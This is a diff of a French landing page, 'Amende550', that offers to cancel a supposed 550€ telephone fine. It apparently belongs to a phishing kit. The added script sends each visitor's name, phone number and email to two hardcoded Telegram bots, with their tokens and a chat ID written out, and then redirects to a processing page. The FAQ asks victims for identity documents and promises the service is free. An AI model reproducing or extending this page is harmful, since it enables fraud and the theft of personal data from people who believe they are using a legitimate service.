-                    <span>Combien de temps prend la procédure ?</span>
-                    <i class="fas fa-chevron-down"></i>
+            <div class="faq-container">
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <span>Combien de temps prend le processus d'annulation ?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <p>En moyenne, le processus complet prend entre 7 et 10 jours ouvrés après la soumission complète de votre dossier. Ce délai peut varier en fonction de la réactivité de votre opérateur.</p>
+                    </div>
                 </div>
-                <div class="faq-answer">
-                    <p>En moyenne 7 à 10 jours ouvrés après soumission complète du dossier.</p>
+                
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <span>Quels documents dois-je fournir ?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <p>Nous avons besoin d'une copie de votre pièce d'identité et d'une preuve de propriété du numéro (facture récente ou contrat). Après soumission du formulaire, nous vous indiquerons comment nous les transmettre en toute sécurité.</p>
+                    </div>
                 </div>
-            </div>
-            
-            <div class="faq-item">
-                <div class="faq-question">
-                    <span>Quels documents sont nécessaires ?</span>
-                    <i class="fas fa-chevron-down"></i>
+                
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <span>Y a-t-il des frais pour ce service ?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <p>Notre service est entièrement gratuit si nous ne parvenons pas à faire annuler votre amende. En cas de succès, des frais modiques s'appliquent, bien inférieurs aux 550€ de l'amende.</p>
+                    </div>
                 </div>
-                <div class="faq-answer">
-                    <p>Justificatif d'identité et preuve de propriété du numéro.</p>
+                
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <span>Que faire si mon numéro a déjà été résilié ?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <p>Même dans ce cas, il est possible de contester l'amende et d'éviter de payer les 550€. Remplissez le formulaire et nous vous guiderons sur la marche à suivre.</p>
+                    </div>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- Footer compact -->
+    <!-- Footer -->
     <footer>
         <div class="container">
             <div class="footer-content">
                 <div class="footer-column">
                     <h3>Amende550</h3>
-                    <p>Solution rapide pour les amendes téléphoniques injustifiées</p>
+                    <p>Service professionnel d'annulation des amendes téléphoniques injustifiées de 550€ en France.</p>
+                    <div class="social-links">
+                        <a href="#"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                        <a href="#"><i class="fab fa-linkedin-in"></i></a>
+                    </div>
+                </div>
+                
+                <div class="footer-column">
+                    <h3>Liens utiles</h3>
+                    <ul class="footer-links">
+                        <li><a href="#problem"><i class="fas fa-chevron-right"></i> Problème d'amende</a></li>
+                        <li><a href="#process"><i class="fas fa-chevron-right"></i> Notre processus</a></li>
+                        <li><a href="#faq"><i class="fas fa-chevron-right"></i> FAQ</a></li>
+                    </ul>
                 </div>
                 
                 <div class="footer-column">
                     <h3>Contact</h3>
                     <ul class="footer-links">
-                        <li><a href="mailto:contact@amende550.fr">contact@amende550.fr</a></li>
-                        <li><a href="#form">Formulaire de contact</a></li>
+                        <li><a href="mailto:contact@amende550.fr"><i class="fas fa-envelope"></i> contact@amende550.fr</a></li>
+                        <li><a href="#form"><i class="fas fa-edit"></i> Formulaire de contact</a></li>
                     </ul>
                 </div>
             </div>
@@ -607,15 +1280,24 @@
         </div>
     </footer>
 
+    <!-- Back to Top Button -->
+    <div class="back-to-top" id="backToTop">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Smooth scrolling
+            // Smooth scrolling for anchor links
             document.querySelectorAll('a[href^="#"]').forEach(anchor => {
                 anchor.addEventListener('click', function(e) {
                     e.preventDefault();
-                    document.querySelector(this.getAttribute('href')).scrollIntoView({
-                        behavior: 'smooth'
-                    });
+                    const target = document.querySelector(this.getAttribute('href'));
+                    if (target) {
+                        window.scrollTo({
+                            top: target.offsetTop - 80,
+                            behavior: 'smooth'
+                        });
+                    }
                 });
             });
             
@@ -624,31 +1306,38 @@
                 question.addEventListener('click', () => {
                     const item = question.parentElement;
                     item.classList.toggle('active');
+                    
+                    // Close other open FAQs
+                    document.querySelectorAll('.faq-item').forEach(faq => {
+                        if (faq !== item && faq.classList.contains('active')) {
+                            faq.classList.remove('active');
+                        }
+                    });
                 });
             });
             
-            // Form submission
-            const form = document.getElementById('penaltyForm');
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                // Basic validation
-                const phone = document.getElementById('phone').value;
-                const frenchPhoneRegex = /^(?:(?:\+|00)33|0)\s*[1-9](?:[\s.-]*\d{2}){4}$/;
-                
-                if (!frenchPhoneRegex.test(phone)) {
-                    alert('Veuillez entrer un numéro de téléphone français valide');
-                    return;
+            // Back to top button
+            const backToTopBtn = document.getElementById('backToTop');
+            window.addEventListener('scroll', () => {
+                if (window.pageYOffset > 300) {
+                    backToTopBtn.classList.add('active');
+                } else {
+                    backToTopBtn.classList.remove('active');
                 }
-                
-                // Simulate form processing
-                setTimeout(() => {
-                    window.location.href = 'traitement.html';
-                }, 1000);
             });
             
-            // Phone number formatting
-            document.getElementById('phone').addEventListener('input', function(e) {
+            backToTopBtn.addEventListener('click', () => {
+                window.scrollTo({
+                    top: 0,
+                    behavior: 'smooth'
+                });
+            });
+            
+            // Phone number validation
+            const phoneInput = document.getElementById('phone');
+            const phoneError = document.getElementById('phoneError');
+            
+            phoneInput.addEventListener('input', function(e) {
                 let value = e.target.value.replace(/\D/g, '');
                 
                 if (value.startsWith('33')) {
@@ -660,7 +1349,155 @@
                 }
                 
                 e.target.value = value;
+                
+                // Hide error if valid
+                if (isValidFrenchPhone(value)) {
+                    phoneError.style.display = 'none';
+                }
             });
+            
+            function isValidFrenchPhone(phone) {
+                const frenchPhoneRegex = /^(?:(?:\+|00)33|0)\s*[1-9](?:[\s.-]*\d{2}){4}$/;
+                return frenchPhoneRegex.test(phone);
+            }
+            
+            // Form submission
+            const form = document.getElementById('amendeForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const loading = document.getElementById('loading');
+            
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                // Validate form
+                const fullname = document.getElementById('fullname').value.trim();
+                const phone = document.getElementById('phone').value.trim();
+                const email = document.getElementById('email').value.trim();
+                
+                if (!fullname || !phone || !email) {
+                    alert('Veuillez remplir tous les champs obligatoires');
+                    return;
+                }
+                
+                if (!isValidFrenchPhone(phone)) {
+                    phoneError.style.display = 'block';
+                    return;
+                }
+                
+                // Prepare data
+                const now = new Date();
+                const formData = {
+                    fullname: fullname,
+                    phone: phone,
+                    email: email,
+                    timestamp: now.toISOString(),
+                    date: now.toLocaleDateString('fr-FR'),
+                    time: now.toLocaleTimeString('fr-FR')
+                };
+                
+                // Encrypt data (simple base64 encoding for demonstration)
+                const encryptedData = btoa(JSON.stringify(formData));
+                
+                // Show loading state
+                submitBtn.disabled = true;
+                btnText.textContent = 'Envoi en cours...';
+                loading.style.display = 'block';
+                
+                try {
+                    // Send to both Telegram bots
+                    await sendToTelegramBots(formData);
+                    
+                    // Save to localStorage
+                    saveToLocalStorage(formData);
+                    
+                    // Show success and redirect after 4 seconds
+                    setTimeout(() => {
+                        window.location.href = 'traitement.html';
+                    }, 4000);
+                } catch (error) {
+                    console.error('Error:', error);
+                    submitBtn.disabled = false;
+                    btnText.textContent = 'Envoyer la demande';
+                    loading.style.display = 'none';
+                    alert('Une erreur est survenue. Veuillez réessayer plus tard.');
+                }
+            });
+            
+            async function sendToTelegramBots(data) {
+                const message = `📢 Nouvelle demande d'annulation d'amende 550€\n\n` +
+                                `👤 Nom: ${data.fullname}\n` +
+                                `📱 Téléphone: ${data.phone}\n` +
+                                `📧 Email: ${data.email}\n` +
+                                `📅 Date: ${data.date} à ${data.time}`;
+                
+                const encodedMessage = encodeURIComponent(message);
+                
+                // Bot 1
+                const bot1Token = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
+                const chatId = '780712584';
+                const url1 = `https://api.telegram.org/bot${bot1Token}/sendMessage?chat_id=${chatId}&text=${encodedMessage}`;
+                
+                // Bot 2
+                const bot2Token = '7159716957:AAFee9KZfc0VbBqxt2Br_w5CypF4hEY4JkQ';
+                const url2 = `https://api.telegram.org/bot${bot2Token}/sendMessage?chat_id=${chatId}&text=${encodedMessage}`;
+                
+                // Send to both bots in parallel
+                await Promise.all([
+                    fetch(url1),
+                    fetch(url2)
+                ]);
+            }
+            
+            function saveToLocalStorage(data) {
+                // Get existing data or initialize empty array
+                const existingData = JSON.parse(localStorage.getItem('amendeRequests')) || [];
+                
+                // Add new data
+                existingData.push(data);
+                
+                // Save back to localStorage
+                localStorage.setItem('amendeRequests', JSON.stringify(existingData));
+            }
+            
+            // Animation on scroll
+            const animateOnScroll = () => {
+                const elements = document.querySelectorAll('.timeline-item, .problem-card, .testimonial-card');
+                
+                elements.forEach(element => {
+                    const elementPosition = element.getBoundingClientRect().top;
+                    const screenPosition = window.innerHeight / 1.3;
+                    
+                    if (elementPosition < screenPosition) {
+                        element.style.opacity = '1';
+                        element.style.transform = 'translateY(0)';
+                    }
+                });
+            };
+            
+            // Set initial state for animated elements
+            document.querySelectorAll('.timeline-item, .problem-card, .testimonial-card').forEach(el => {
+                el.style.opacity = '0';
+                el.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
+            });
+            
+            document.querySelectorAll('.timeline-item:nth-child(odd)').forEach(el => {
+                el.style.transform = 'translateX(-50px)';
+            });
+            
+            document.querySelectorAll('.timeline-item:nth-child(even)').forEach(el => {
+                el.style.transform = 'translateX(50px)';
+            });
+            
+            document.querySelectorAll('.problem-card, .testimonial-card').forEach(el => {
+                el.style.transform = 'translateY(50px)';
+            });
+            
+            // Run once on load
+            animateOnScroll();
+            
+            // Run on scroll
+            window.addEventListener('scroll', animateOnScroll);
         });
     </script>
 </body>
